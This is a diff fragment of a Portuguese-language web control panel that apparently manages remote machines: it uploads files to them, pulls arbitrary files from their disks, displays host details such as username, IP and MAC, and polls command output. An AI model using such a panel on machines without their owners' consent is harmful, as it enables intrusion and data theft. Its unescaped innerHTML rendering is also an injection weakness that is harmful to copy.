+                    outputBox.textContent = '❌ Máquina offline';
+                }
+            } catch (e) {
+                log(`Erro: ${e.message}`, 'error');
+            }
+        }
+
+        async function uploadFile(id) {
+            const fileInput = document.getElementById(`file-${id}`);
+            const file = fileInput.files[0];
+            
+            if (!file) {
+                log(`Nenhum arquivo selecionado`, 'error');
+                return;
+            }
+
+            log(`⬆ Upload: ${file.name}`, 'info');
+            
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('idMachine', id);
+
+            const progressDiv = document.getElementById(`progress-${id}`);
+            const progressFill = document.getElementById(`fill-${id}`);
+            const progressText = document.getElementById(`progress-text-${id}`);
+            progressDiv.classList.add('show');
+
+            try {
+                const xhr = new XMLHttpRequest();
+                
+                xhr.upload.addEventListener('progress', (e) => {
+                    if (e.lengthComputable) {
+                        const pct = Math.round((e.loaded / e.total) * 100);
+                        progressFill.style.width = pct + '%';
+                        progressText.textContent = pct + '%';
+                    }
+                });
+
+                xhr.addEventListener('load', () => {
+                    if (xhr.status === 200) {
+                        log(`✓ Upload concluído: ${file.name}`, 'success');
+                        progressDiv.classList.remove('show');
+                        fileInput.value = '';
+                    } else {
+                        log(`✗ Erro no upload`, 'error');
+                    }
+                });
+
+                xhr.addEventListener('error', () => {
+                    log(`Erro na conexão`, 'error');
+                });
+
+                xhr.open('POST', `/upload?idMachine=${encodeURIComponent(id)}`);
+                xhr.send(formData);
+            } catch (e) {
+                log(`Erro: ${e.message}`, 'error');
+            }
+        }
+
+        async function requestFile(id) {
+            const fileInput = document.getElementById(`download-${id}`);
+            const filepath = fileInput.value.trim();
+
+            if (!filepath) {
+                log(`Caminho do arquivo vazio`, 'error');
+                return;
+            }
+
+            log(`⬇ Download solicitado: ${filepath}`, 'info');
+
+            try {
+                const res = await fetch('/request-file', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ idMachine: id, filepath: filepath })
+                });
+
+                if (res.ok) {
+                    const data = await res.json();
+                    const downloadId = data.downloadId;
+                    
+                    log(`✓ Iniciando recebimento de chunks...`, 'info');
+                    
+                    // Polling até arquivo estar pronto
+                    let pollCount = 0;
+                    const pollInterval = setInterval(async () => {
+                        pollCount++;
+                        try {
+                            const statusRes = await fetch(`/get-download-progress/${downloadId}`);
+                            const statusData = await statusRes.json();
+                            
+                            if (statusData.receivedChunks > 0) {
+                                const progress = statusData.progress || Math.round((statusData.receivedChunks / statusData.totalChunks) * 100);
+                                log(`📥 Recebido: ${statusData.receivedChunks}/${statusData.totalChunks} chunks (${progress}%)`, 'info');
+                            }
+                            
+                            // Se terminou
+                            if (statusData.receivedChunks === statusData.totalChunks && statusData.totalChunks > 0) {
+                                clearInterval(pollInterval);
+                                log(`✓ Todos os chunks recebidos, descompactando...`, 'success');
+                                
+                                // Buscar arquivo .bin comprimido
+                                const binRes = await fetch(`/get-download-bin/${downloadId}`);
+                                if (binRes.ok) {
+                                    const binData = await binRes.arrayBuffer();
+                                    
+                                    log(`🔐 Descompactando arquivo...`, 'info');
+                                    
+                                    // Descomprimir com pako no front
+                                    const compressedArray = new Uint8Array(binData);
+                                    const decompressed = pako.ungzip(compressedArray);
+                                    
+                                    // Fazer download
+                                    const blob = new Blob([decompressed], { type: 'application/octet-stream' });
+                                    const url = URL.createObjectURL(blob);
+                                    const link = document.createElement('a');
+                                    link.href = url;
+                                    link.download = filepath.split(/[\\\/]/).pop() || 'download';
+                                    document.body.appendChild(link);
+                                    link.click();
+                                    document.body.removeChild(link);
+                                    URL.revokeObjectURL(url);
+                                    
+                                    log(`✓ Download completo! (${(decompressed.length / (1024*1024)).toFixed(2)} MB)`, 'success');
+                                    fileInput.value = '';
+                                } else {
+                                    const errorData = await binRes.json();
+                                    log(`✗ Erro ao baixar arquivo: ${errorData.error || binRes.statusText}`, 'error');
+                                }
+                            }
+                        } catch (e) {
+                            if (pollCount > 300) { // Timeout de 150 segundos (300 * 500ms)
+                                clearInterval(pollInterval);
+                                log(`✗ Timeout aguardando arquivo`, 'error');
+                            }
+                        }
+                    }, 500);
+                } else {
+                    log(`✗ Máquina offline`, 'error');
+                }
+            } catch (e) {
+                log(`Erro: ${e.message}`, 'error');
+            }
+        }
+
+        async function showMachineInfo(id) {
+            const infoDiv = document.getElementById(`info-${id}`);
+            
+            if (infoDiv.classList.contains('show')) {
+                infoDiv.classList.remove('show');
+                return;
+            }
+            
+            try {
+                const res = await fetch(`/machine-info/${id}`);
+                const data = await res.json();
+
+                if (data.error) {
+                    infoDiv.innerHTML = `<p style="color: #f00;">Erro: ${data.error}</p>`;
+                    infoDiv.classList.add('show');
+                    return;
+                }
+
+                let html = '';
+
+                if (data.info && Object.keys(data.info).length > 0) {
+                    html += `<div class="info-row"><div class="label">Username:</div><div class="value">${data.info.username || 'N/A'}</div></div>`;
+                    html += `<div class="info-row"><div class="label">Hostname:</div><div class="value">${data.info.hostname || 'N/A'}</div></div>`;
+                    html += `<div class="info-row"><div class="label">IP Local:</div><div class="value">${data.info.ipAddress || 'N/A'}</div></div>`;
+                    html += `<div class="info-row"><div class="label">MAC:</div><div class="value">${data.info.macAddress || 'N/A'}</div></div>`;
+                    html += `<div class="info-row"><div class="label">IP Remoto:</div><div class="value">${data.ip}</div></div>`;
+                    html += `<div class="info-row"><div class="label">Sistema:</div><div class="value">${data.info.platform || 'N/A'}</div></div>`;
+                    html += `<div class="info-row"><div class="label">Arquitetura:</div><div class="value">${data.info.arch || 'N/A'}</div></div>`;
+                    html += `<div class="info-row"><div class="label">CPU:</div><div class="value">${data.info.cpus || 'N/A'}</div></div>`;
+                    html += `<div class="info-row"><div class="label">Memória Total:</div><div class="value">${data.info.totalMemory || 'N/A'}</div></div>`;
+                    html += `<div class="info-row"><div class="label">Memória Livre:</div><div class="value">${data.info.freeMemory || 'N/A'}</div></div>`;
+                    html += `<div class="info-row"><div class="label">Uptime:</div><div class="value">${data.info.uptime || 'N/A'}</div></div>`;
+                }
+
+                if (data.files && data.files.length > 0) {
+                    html += `<h4 style="color: #0f0; margin-top: 15px; margin-bottom: 10px;">📥 Arquivos Prontos para Download (${data.files.length})</h4>`;
+                    data.files.forEach((file, idx) => {
+                        html += `<div class="file-item">`;
+                        html += `<div class="file-name">🔗 ${file.filename}</div>`;
+                        html += `<div class="file-info">💾 ${(file.size / 1024).toFixed(2)} KB</div>`;
+                        html += `<button onclick="downloadFile('${file.downloadId}', '${file.filename.replace(/'/g, "\\'")}')​" style="width: 100%; margin-top: 8px; background: #0f0; color: #000; padding: 6px; border: none; cursor: pointer; border-radius: 3px; font-weight: bold;">⬇️ Download</button>`;
+                        html += `</div>`;
+                    });
+                } else {
+                    html += `<h4 style="color: #777; margin-top: 15px;">📥 Nenhum arquivo aguardando download</h4>`;
+                }
+
+                infoDiv.innerHTML = html;
+                infoDiv.classList.add('show');
+                log(`✓ Informações carregadas`, 'success');
+                
+                // Polling automático para atualizar lista de downloads a cada 3 segundos
+                clearInterval(window.infoPolling);
+                window.infoPolling = setInterval(async () => {
+                    if (!infoDiv.classList.contains('show')) {
+                        clearInterval(window.infoPolling);
+                        return;
+                    }
+                    try {
+                        const refreshRes = await fetch(`/machine-info/${id}`);
+                        const refreshData = await refreshRes.json();
+                        
+                        if (refreshData.files && refreshData.files.length > 0) {
+                            let filesHtml = `<h4 style="color: #0f0; margin-top: 15px; margin-bottom: 10px;">📥 Arquivos Prontos para Download (${refreshData.files.length})</h4>`;
+                            refreshData.files.forEach((file) => {
+                                filesHtml += `<div class="file-item">`;
+                                filesHtml += `<div class="file-name">🔗 ${file.filename}</div>`;
+                                filesHtml += `<div class="file-info">💾 ${(file.size / 1024).toFixed(2)} KB</div>`;
+                                filesHtml += `<button onclick="downloadFile('${file.downloadId}', '${file.filename.replace(/'/g, "\\'")}')​" style="width: 100%; margin-top: 8px; background: #0f0; color: #000; padding: 6px; border: none; cursor: pointer; border-radius: 3px; font-weight: bold;">⬇️ Download</button>`;
+                                filesHtml += `</div>`;
+                            });
+                            // Atualizar apenas a seção de files
+                            const existingFilesDiv = infoDiv.querySelector('h4');
+                            if (existingFilesDiv) {
+                                existingFilesDiv.parentElement.innerHTML = filesHtml + existingFilesDiv.parentElement.innerHTML.split('h4')[0];
+                            }
+                        }
+                    } catch (e) {
+                        // Silenciar erros de polling
+                    }
+                }, 3000);
+            } catch (e) {
+                log(`Erro ao carregar: ${e.message}`, 'error');
+                infoDiv.innerHTML = `<p style="color: #f00;">Erro ao carregar informações</p>`;
+                infoDiv.classList.add('show');
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const modal = document.getElementById('controlModal');
+            window.addEventListener('click', (e) => {
+                if (e.target === modal) {
+                    closeModal();
+                }
+            });
+            
+            loadCustomData();
+        });
+
+        function downloadFile(downloadId, filename) {
+            const url = `/get-download/${downloadId}`;
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = filename || 'download';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            log(`✓ Download iniciado: ${filename}`, 'success');
+        }
+
+        async function pollResults() {
+            try {
+                const res = await fetch('/command-results');
+                const data = await res.json();
+                
+                for (const machineId in data) {
+                    const outputBox = document.getElementById(`output-${machineId}`);
+                    if (outputBox && data[machineId]) {
+                        outputBox.textContent = data[machineId];
+                        resultados[machineId] = data[machineId];
+                    }
+                }
+            } catch (e) {
+                // Silenciar erros de polling
+            }
+        }
+
+        setInterval(fetchMachines, 5000);
+        setInterval(pollResults, 1000);
+        fetchMachines();
+        loadCustomData();
+    </script>
+</body>
+</html>
